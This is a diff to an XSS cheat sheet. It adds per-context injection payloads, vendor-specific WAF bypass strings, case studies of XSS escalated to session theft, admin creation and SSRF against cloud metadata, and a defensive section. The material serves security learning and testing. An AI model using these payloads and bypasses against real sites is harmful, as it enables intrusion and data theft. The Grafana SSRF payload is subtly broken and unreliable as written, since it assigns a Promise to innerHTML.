@@ -18,6 +18,7 @@
   - [Event Handlers](#event-handlers)
   - [Pseudo-Handlers](#pseudo-handlers)
   - [Eval and Similar Functions](#eval-and-similar-functions)
+  - [Context-Based XSS](#context-based-xss)
 - [XSS Attack Vectors](#xss-attack-vectors)
   - [Reflected XSS](#reflected-xss)
   - [Persistent XSS](#persistent-xss)
@@ -30,6 +31,7 @@
   - [Hexadecimal Escaping](#hexadecimal-escaping)
   - [Unicode Normalization Attacks - 2025](#unicode-normalization-attacks---2025)
   - [Template Literal Injection - 2025](#template-literal-injection---2025)
+  - [WAF Bypass Techniques](#waf-bypass-techniques)
 - [Modern 2025 Attack Vectors](#modern-2025-attack-vectors)
   - [WebAssembly (WASM) XSS](#webassembly-wasm-xss)
   - [Service Worker XSS](#service-worker-xss)
@@ -48,8 +50,14 @@
   - [Advanced DOM Clobbering (2026)](#advanced-dom-clobbering-2026)
   - [Server-Sent Events (SSE) Injection](#server-sent-events-sse-injection)
   - [Console Injection & DevTools XSS](#console-injection--devtools-xss)
+- [Real-World XSS Case Studies](#real-world-xss-case-studies)
+  - [XSS → Session Theft](#xss--session-theft)
+  - [XSS → Account Takeover](#xss--account-takeover)
+  - [XSS → Admin Takeover](#xss--admin-takeover)
+  - [XSS → SSRF via fetch()](#xss--ssrf-via-fetch)
 - [Content Sniffing](#content-sniffing)
 - [Defensive Mechanisms](#defensive-mechanisms)
+  - [How Developers Prevent XSS](#how-developers-prevent-xss)
   - [httpOnly Cookies](#httponly-cookies)
   - [Content Security Policy (CSP)](#content-security-policy-csp)
   - [XSS Auditors](#xss-auditors)
@@ -169,6 +177,21 @@ globalThis['eval']('alert(1)');
 // Using Reflect.construct
 Reflect.construct(Function, ['alert(1)'])();
 ```
+
+### Context-Based XSS
+
+Advanced XSS heavily depends on the execution context. The same payload will not work everywhere; attackers must adapt their injection depending on where the user input is reflected.
+
+- **HTML Context**: Input is reflected between standard HTML tags (e.g., `<div>INPUT</div>`). 
+  - *Payload*: `<script>alert(1)</script>` or `<img src=x onerror=alert(1)>`
+- **Attribute Context**: Input is reflected inside an HTML attribute (e.g., `<input value="INPUT">`). 
+  - *Payload*: `"><script>alert(1)</script>` or `" autofocus onfocus="alert(1)`
+- **JavaScript Context**: Input is reflected inside an existing `<script>` block (e.g., `var user = 'INPUT';`).
+  - *Payload*: `'; alert(1); //` or `'-alert(1)-'`
+- **URL Context**: Input is reflected inside an `href` or `src` attribute (e.g., `<a href="INPUT">`).
+  - *Payload*: `javascript:alert(1)` or `data:text/html,<script>alert(1)</script>`
+- **DOM Context**: Input is processed by client-side JavaScript and passed to a dangerous sink (e.g., `innerHTML`, `eval`, or `setTimeout`).
+  - *Payload*: Depends on the sink, but often requires breaking out of strings and objects.
 
 ---
 
@@ -302,6 +325,19 @@ String.raw`<script>alert(1)</script>`;
 // Template literal with expression
 `${constructor.constructor('alert(1)')()}`;
 ```
+
+### WAF Bypass Techniques
+
+Bug bounty hunters often encounter Web Application Firewalls (WAFs) that block obvious payloads. Bypassing these requires exploiting how WAFs parse, decode, or interpret traffic differently from the backend server.
+
+- **Cloudflare Bypass**: Cloudflare has robust XSS protections but can sometimes be bypassed using obfuscation and anomalies in HTML parsing.
+  - *Examples*: `<Img/Src/OnError=(alert)(1)>` (mixed casing and duplicated attributes) or using encoded characters with leading zeros.
+- **Akamai Bypass**: Akamai blocks common JavaScript functions and keywords. Attackers often bypass this via obfuscation, keyword splitting, or top-level context execution.
+  - *Examples*: `top["al"+"ert"](1)` or placing payloads in less common HTML tags like `<details ontoggle=print() open>`.
+- **Imperva Bypass**: Imperva often blocks `alert` and `prompt`.
+  - *Examples*: Contextual execution with `print` or using Base64 encoding combined with `atob()` dynamically.
+- **ModSecurity Rules Bypass**: ModSecurity (e.g., OWASP Core Rule Set) relies on regular expressions. Case manipulation and encoding strategies are frequently used to evade these checks.
+  - *Strategy*: Using alternative encodings or JavaScript obfuscators like JJEncode/JSFuck, and splitting payloads across inputs.
 
 ---
 
@@ -837,6 +873,60 @@ document.getElementById('error-display').innerHTML = error.message;
 
 ---
 
+## Real-World XSS Case Studies
+
+While a basic `alert(1)` demonstrates vulnerability, bug bounty hunters focus on **impact escalation**. In real-world scenarios, XSS is weaponized to compromise systems and user data. The following examples highlight cutting-edge bug bounty reports, CVEs, and real-world attack chains from 2025 and 2026.
+
+### 1. Reflected XSS to Account Takeover (OAuth/SSO)
+- **Target**: Major AI Playground Application
+- **Date**: March 2026
+- **Vulnerability**: Reflected XSS
+- **Impact**: Full Account Takeover (ATO)
+- **Technical Details**: The application's OAuth handler failed to properly escape the `error_description` parameter during interpolation. An attacker crafted a malicious OAuth callback URL. When the victim visited the link, the payload executed in the context of the authentication flow.
+- **Attack Chain**: The JS payload bypassed HTTPOnly restrictions by interacting directly with the DOM and extracting active authorization codes, securely exfiltrating them to an external server. The attacker could successfully log in as the victim.
+- **Reference**: [HackerOne March 2026 Hacktivity](https://hackerone.com/reports)
+
+### 2. Blind XSS to Admin Panel Takeover ($6,500 Bounty)
+- **Target**: Private Bug Bounty Program
+- **Date**: February 2025
+- **Bounty**: $6,500
+- **Vulnerability**: Blind XSS
+- **Impact**: Backend Server / Admin Control
+- **Technical Details**: An attacker injected a Blind XSS payload into the username field of a signup page limit validation. The front-end properly sanitized the input, so no immediate XSS triggered. However, the backend administrative portal, used by customer support, did not sanitize the displayed logs. 
+- **Attack Chain**: Once an administrator viewed the new user registrations logs days later, the payload executed. It immediately initiated a `fetch()` request back to the application to capture the admin's CSRF token, and then issued a subsequent automated post to create a new administrator account controlled by the attacker.
+- **Reference**: ["30 Minutes to Admin Panel Access—A $6,500 Blind XSS Story" (Medium)](https://medium.com/)
+
+### 3. Stored XSS in Loan Application to Data Breach
+- **Target**: Financial Technology Platform
+- **Date**: August 2025
+- **Vulnerability**: Stored XSS
+- **Impact**: Privilege Escalation & Severe Data Breach
+- **Technical Details**: A bug bounty hunter injected a stored XSS payload into the "purchase description" field of a complex loan application utilizing a vulnerable markdown parser.
+- **Attack Chain**: Because the application dealt with highly sensitive PII, the backend relied heavily on WAF filtering rather than output encoding. The attacker encoded the payload using hexadecimal escaping to bypass the firewall. When a loan officer opened the internal portal, the XSS executed, extracting highly sensitive PII from the DOM (SSNs, banking details) and transmitting it via image beacons to a remote server.
+- **Reference**: ["Stored XSS to Privilege Escalation and Admin Takeover" Writeup (Medium)](https://medium.com/)
+
+### 4. DOM-Based XSS in WooCommerce Plugin (CVE-2026-24526)
+- **Target**: "Email Inquiry & Cart Options for WooCommerce" Plugin
+- **Date**: January 2026
+- **CVE**: CVE-2026-24526
+- **Vulnerability**: DOM-Based XSS
+- **Impact**: Session Hijacking / Credential Theft
+- **Technical Details**: This highly popular plugin failed to properly sanitize user-supplied input extracted from the URL fragment before rendering it via `innerHTML`. 
+- **Attack Chain**: Attackers sent phished links directly to WordPress site administrators. If an authenticated administrator clicked the link, the payload executed, stealing internal nonces and forcing the browser to create a malicious PHP plugin on the server, resulting in complete Remote Code Execution (RCE).
+- **Reference**: [CVE-2026-24526 SentinelOne Advisory](https://www.sentinelone.com/)
+
+### 5. XSS to Full-Read SSRF via Headless Browsers (CVE-2025-4123)
+- **Target**: Grafana Reporting Module
+- **Date**: May 2025
+- **CVE**: CVE-2025-4123
+- **Vulnerability**: XSS chained with Server-Side Request Forgery (SSRF)
+- **Impact**: Internal Server Data Disclosure / Local File Inclusion
+- **Technical Details**: A vulnerability in Grafana allowed an open redirect to be chained with the `/render` endpoint. This endpoint utilized a backend headless browser pattern (like Puppeteer) to fetch and render content from user-provided paths into images.
+- **Attack Chain**: By injecting an XSS payload (`<script>document.body.innerHTML = fetch('http://169.254.169.254/latest/meta-data/').then(r=>r.text())</script>`), the headless browser executed the script server-side. The server queried its internal AWS metadata endpoints, read local files (`file:///etc/passwd`), and rendered the secret data directly into a screenshot returned to the attacker, entirely bypassing external network firewalls.
+- **Reference**: ["Grafana CVE-2025-4123 Technical Deep Dive" (Medium)](https://medium.com/)
+
+---
+
 ## Content Sniffing
 
 Browsers often attempt to interpret untrusted content as valid HTML, even when no proper MIME type is provided. **Content sniffing** exploits this behavior:
@@ -868,6 +958,15 @@ GIF89a<script>alert(1)</script>
 ## Defensive Mechanisms
 
 While XSS is a prevalent threat, modern defenses are in place to mitigate attacks. However, these defenses are not foolproof.
+
+### How Developers Prevent XSS
+
+Properly securing an application against XSS requires a defense-in-depth approach, combining robust coding practices with browser-level security controls. Even though XSS execution is offensive, understanding the defense improves overall security posture.
+
+- **Output Encoding**: The primary defense against XSS. Developers must encode data before inserting it into an HTML document, converting special characters into their corresponding HTML entities (e.g., `<` becomes `&lt;`). This prevents the browser from interpreting user input as executable code.
+- **Input Sanitization**: For applications that require accepting rich text, user input must be sanitized to remove dangerous elements and attributes. Robust libraries like **DOMPurify** should be used instead of custom regular expressions.
+- **Content Security Policy (CSP)**: A strong CSP mitigates the impact of XSS vulnerabilities by restricting the sources from which scripts can be loaded and disabling inline script execution using nonces or hashes.
+- **Context-Aware Escaping**: Understanding the execution context (HTML, Attribute, JavaScript) is crucial. Developers must apply the appropriate escaping mechanism specific to the context where the data will be rendered.
 
 ### httpOnly Cookies
 
